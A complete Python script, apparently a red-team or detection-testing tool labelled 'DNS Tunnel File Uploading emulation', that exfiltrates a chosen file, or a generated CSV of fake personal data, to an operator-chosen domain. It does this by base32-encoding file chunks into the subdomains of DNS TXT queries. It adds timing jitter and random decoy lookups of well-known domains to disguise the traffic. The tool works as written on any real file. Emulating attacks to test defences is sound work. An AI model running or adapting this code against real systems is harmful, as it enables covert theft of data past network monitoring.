import argparse
import sys
import base64
import random
import string
import csv
import re
import os
import logging
import time

try:
    from faker import Faker
except ImportError:
    print("Missing dependency faker: <https://pypi.org/project/Faker/>. Please install it with `pip install Faker`.")
    sys.exit(1)

try:
    import dns.resolver
except ImportError:
    print("Missing dependency dnspython: <https://pypi.org/project/dnspython/>. Please install it with `pip install dnspython`.")
    sys.exit(1)


# defines the log format
LOG_FORMAT = "%(asctime)s.%(msecs)03d - %(levelname)s - %(message)s"
DATE_FORMAT = "%m/%d/%Y %H:%M:%S"
logging.basicConfig(filename='my.log', level=logging.INFO, format=LOG_FORMAT, datefmt=DATE_FORMAT)

HOST = ['.google.com','.facebook.com','.twitter.com','.microsoft.com']


# generate a csv file containing PII data
def csv_generator(filename, fake, line):
    if sys.version_info[0] == 2:
        csvfile = open(filename, 'w')
    else:
        csvfile = open(filename, 'w', newline='')
    fieldnames = ['last name', 'first name', 'title', 'telephone number', 'street address', 'city', 'state', 'postal code', 'email', 'social security number']
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    writer.writeheader()
    for _ in range(line):
        writer.writerow({'last name':fake.last_name(),'first name':fake.first_name(), 'title':fake.prefix(), 'telephone number':fake.phone_number(), 'street address':fake.street_address(), 'city':fake.city(), 'state':fake.state(), 'postal code':fake.postcode(), 'email':fake.email(), 'social security number':fake.ssn()})
    csvfile.close()


# the domain will be base32(argv[0]).base32(argv[1]).base32(argv[2])...{base_domain}
def payload_generator(domain,*argv):
    result = domain
    for i in argv[::-1]:
        if isinstance(i,bytes):
            result = base64.b32encode(i).decode()+"."+result
        else:
            result = base64.b32encode(i.encode()).decode()+"."+result
    return result


def is_valid_ip(ip):
    if re.match(r'^((\d{1,2}|1\d{2}|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d{2}|2[0-4]\d|25[0-5])$', ip):  
        return True  
    else:
        return False


def dns_query_sender(domain,record):
    logging.info("sending dns requry of {domain} on type {record} ".format(domain=domain,record=record))
    request = my_resolver.query(domain, record)
    time.sleep(random.uniform(interval*(1-jitter), interval*(1+jitter)))
    logging.info("received dns response of {domain} on type {record}, {value}".format(domain=domain,record=record,value=str(request.response.answer[0][-1])))
    if random_dns:
        domain = ''.join(random.choice(string.ascii_letters) for i in range(8)) + random.choice(HOST)
        logging.info("sending dns requry of {domain} on type {record} ".format(domain=domain,record=record))
        request = my_resolver.query(domain, record)
        time.sleep(random.uniform(interval*(1-jitter), interval*(1+jitter)))
        logging.info("received dns response of {domain} on type {record}, {value}".format(domain=domain,record=record,value=str(request.response.answer[0][-1])))
    return request


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="DNS Tunnel File Uploading emulation")
    parser.add_argument("-domain", help = "the domain to send data to", required=True)
    parser.add_argument("-f", help="the path of the file to be exfiltrated", required=False)
    parser.add_argument("-size", type=int, default=100, help="the number of lines of PII data to generate, default to be 100", required=False)
    parser.add_argument("-i", default=0, type=int, help="the interval time in seconds of the DNS query, default to be 0", required=False)
    parser.add_argument("-j", default=0, type=float, help="the jitter value(between 0 and 1) of the DNS query, to add randomization to the interval, default to be 0", required=False)
    parser.add_argument("-dns", help = "specific dns server ip(IPv4)", required=False)
    parser.add_argument('-random', dest='random', help="add random dns query in between", action='store_true')
    parser.add_argument("-v", type=int, default=0, help = "verbose level, default to be 0", required=False)
    args = parser.parse_args()

    # user has specified the file to exfiltrated
    # only if the file exist, then transfer this file
    # otherwise, generate PII data on the spot
    if args.f:
        if os.path.exists(args.f):
            filepath = args.f
            filename = os.path.basename(filepath)
    else:
        filepath = filename = (''.join(random.choice(string.ascii_letters) for i in range(8)))+'.csv'
        fake = Faker('en_US')
        csv_generator(filename,fake,args.size)
    
    if args.random:
        random_dns = True
    else:
        random_dns = False

    domain = args.domain
    interval = args.i
    jitter = args.j
    if jitter > 1 or jitter < 0:
        jitter = random.uniform(0,1)

    global my_resolver
    # initialize the dns_resolver only if the ip is valid
    # if user has specify the dns server to use
    if args.dns and is_valid_ip(args.dns):
        my_resolver = dns.resolver.Resolver(configure=False)
        my_resolver.nameservers = [args.dns]
    # otherwise, use the default dns server
    else:
        my_resolver = dns.resolver.Resolver()

    initiator = payload_generator(domain, "INIT", filename)

    # initiate the file transfer
    while True:
        print("Initiating with the server")
        request = dns_query_sender(initiator, "TXT")
        if request.response.answer[0][-1].strings[0] == b"OK":
            print("Start file transfering")
            with open(filepath, 'rb') as f:
                cnt = 0
                while True:
                    # at most 35 bytes of data in one segment of domain name
                    byte_s = f.read(35)
                    # finish sending, send the ending request to signify end of file transfer
                    if not byte_s:
                        print("done")
                        payload = payload_generator(domain, "DONE", str(cnt+1))
                        request = dns_query_sender(payload, "TXT")
                        while request.response.answer[0][-1].strings[0] != b"OK":
                            request = dns_query_sender(payload, "TXT")
                        print("{filename} transfer finished!".format(filename=filename))
                        sys.exit(0)
                    payload = payload_generator(domain, byte_s, str(cnt))
                    if args.v:
                        print(payload)
                    request = dns_query_sender(payload, "TXT")
                    while request.response.answer[0][-1].strings[0] != b"OK":
                        request = dns_query_sender(payload, "TXT")
                    cnt = (cnt+1) % 10
